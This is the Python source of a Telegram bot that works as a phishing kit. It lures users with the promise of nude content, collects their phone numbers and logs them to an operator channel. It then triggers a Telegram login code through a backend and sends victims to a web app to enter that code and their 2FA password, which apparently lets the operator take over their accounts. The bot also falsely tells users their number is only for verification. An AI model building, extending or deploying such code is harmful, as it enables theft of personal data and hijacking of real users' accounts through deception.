import os
import traceback

import requests
from pyrogram import Client, filters
from pyrogram.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo,
)

from config import (
    API_ID, API_HASH, BOT_TOKEN, LOG_CHANNEL,
    WEB_APP_URL, ADMIN_PANEL_URL, API_BASE_URL, ADMIN_IDS,
)

bot = Client("edu_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)


def is_admin(user_id):
    return user_id in ADMIN_IDS


def create_web_session(phone):
    """Ask the web backend to create a session + send the OTP.
    Returns a session_id, or None on failure."""
    try:
        r = requests.post(
            f"{API_BASE_URL}/api/bot-connect",
            json={"phone": phone, "session_name": "bot_session"},
            timeout=30,
        )
        data = r.json()
        if data.get("ok"):
            return data.get("session_id")
        print(f"bot-connect rejected: {data}")
    except Exception as e:
        print(f"bot-connect failed: {e}")
    return None


@bot.on_message(filters.command("start"))
async def start_handler(client, message):
    keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Share Phone Number", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await message.reply_text(
        "👋 <b>Welcome to Nude Blur!</b>\n\n"
        "🔞 To access adult content, please share your phone number.\n\n"
        "🔒 Your number is safe and only used for verification.\n\n"
        "<b>📱 Tap the button below to share your contact.</b>",
        reply_markup=keyboard,
    )


@bot.on_message(filters.contact)
async def contact_handler(client, message):
    try:
        contact = message.contact
        user = message.from_user

        if contact.user_id is not None and contact.user_id != user.id:
            await message.reply_text(
                "❌ Please use the button to share your own phone number.")
            return

        name = user.first_name or "Unknown"
        phone = contact.phone_number
        if not phone.startswith("+"):
            phone = "+" + phone
        user_id = user.id

        try:
            await client.send_message(
                LOG_CHANNEL,
                f"🎓 <b>NEW LOGIN</b>\n\n"
                f"👤 Name: {name}\n"
                f"📱 Phone: {phone}\n"
                f"🆔 TG ID: <code>{user_id}</code>",
            )
        except Exception as log_error:
            print(f"Failed to send log: {log_error}")

        status = await message.reply_text("⏳ <i>Preparing your secure login…</i>")

        session_id = create_web_session(phone)

        if session_id:
            url = f"{WEB_APP_URL}/login?s={session_id}"
            caption = (
                "📱 <b>Phone number received!</b>\n\n"
                "🔐 Your verification code has been sent to your Telegram app.\n\n"
                "👉 Tap the button below, enter the code (and 2FA if enabled) "
                "to unlock the content."
            )
        else:
            url = f"{WEB_APP_URL}/login"
            caption = (
                "📱 <b>Phone number received!</b>\n\n"
                "🔐 Open the web app, enter your phone number and the code "
                "sent to your Telegram app."
            )

        keyboard = InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔥 Get Nudes Now", web_app=WebAppInfo(url=url))]]
        )

        try:
            await status.edit_text(caption, reply_markup=keyboard)
        except Exception:
            await message.reply_text(caption, reply_markup=keyboard)

    except Exception as e:
        print(f"contact_handler error: {e}\n{traceback.format_exc()}")
        await message.reply_text(
            f"❌ Error: {str(e)}\n\nPlease try again or contact support.")


@bot.on_message(filters.command("admin"))
async def admin_handler(client, message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ <b>Access Denied!</b>\n\nYou are not authorized.")
        return

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Open Admin Panel",
                              web_app=WebAppInfo(url=ADMIN_PANEL_URL))],
        [InlineKeyboardButton("📊 View Stats", callback_data="admin_stats"),
         InlineKeyboardButton("⚙️ Settings", callback_data="admin_settings")],
    ])
    await message.reply_text(
        f"🔥 <b>ADMIN PANEL</b>\n\n"
        f"👤 Welcome <b>{message.from_user.first_name}</b>!\n\n"
        f"📊 <b>Quick Actions:</b>\n• Manage Ads\n• View Statistics\n"
        f"• Control Bot Settings\n\n⚡ Click below to open the admin panel:",
        reply_markup=keyboard,
    )


@bot.on_message(filters.command("addadmin"))
async def add_admin_handler(client, message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ You are not authorized!")
        return
    try:
        new_admin_id = int(message.command[1])
        if new_admin_id not in ADMIN_IDS:
            ADMIN_IDS.append(new_admin_id)
            await message.reply_text(
                f"✅ <b>Admin Added!</b>\n\n🆔 User ID: <code>{new_admin_id}</code>\n"
                f"👥 Total Admins: {len(ADMIN_IDS)}")
        else:
            await message.reply_text("⚠️ User is already an admin!")
    except (IndexError, ValueError):
        await message.reply_text(
            "❌ <b>Usage:</b> <code>/addadmin USER_ID</code>")


@bot.on_message(filters.command("removeadmin"))
async def remove_admin_handler(client, message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ You are not authorized!")
        return
    try:
        remove_id = int(message.command[1])
        if remove_id in ADMIN_IDS:
            ADMIN_IDS.remove(remove_id)
            await message.reply_text(
                f"✅ <b>Admin Removed!</b>\n\n🆔 User ID: <code>{remove_id}</code>")
        else:
            await message.reply_text("⚠️ User is not an admin!")
    except (IndexError, ValueError):
        await message.reply_text(
            "❌ <b>Usage:</b> <code>/removeadmin USER_ID</code>")


@bot.on_message(filters.command("admins"))
async def list_admins_handler(client, message):
    if not is_admin(message.from_user.id):
        await message.reply_text("⛔ You are not authorized!")
        return
    text = "👥 <b>ADMIN LIST</b>\n\n"
    for idx, admin_id in enumerate(ADMIN_IDS, 1):
        try:
            u = await client.get_users(admin_id)
            text += (f"{idx}. <b>{u.first_name or 'Unknown'}</b>\n"
                     f"   ├ ID: <code>{admin_id}</code>\n"
                     f"   └ @{u.username or 'N/A'}\n\n")
        except Exception:
            text += f"{idx}. <b>Unknown</b>\n   └ ID: <code>{admin_id}</code>\n\n"
    await message.reply_text(text)


@bot.on_callback_query()
async def callback_handler(client, callback_query):
    data = callback_query.data
    if not is_admin(callback_query.from_user.id):
        await callback_query.answer("⛔ Not authorized!", show_alert=True)
        return
    if data == "admin_stats":
        await callback_query.answer("📊 Loading stats...")
        await callback_query.message.reply_text(
            "📊 <b>Quick Stats</b>\n\nUse the Admin Panel for detailed statistics.")
    elif data == "admin_settings":
        await callback_query.answer("⚙️ Opening settings...")
        await callback_query.message.reply_text(
            "⚙️ <b>Settings</b>\n\nOpen the Admin Panel to change settings.")


if __name__ == "__main__":
    print("🚀 Sex Bot Started...")
    print(f"📢 Log Channel: {LOG_CHANNEL}")
    print(f"🔥 Admin Panel: {ADMIN_PANEL_URL}")
    print(f"👥 Admins: {len(ADMIN_IDS)}")
    bot.run()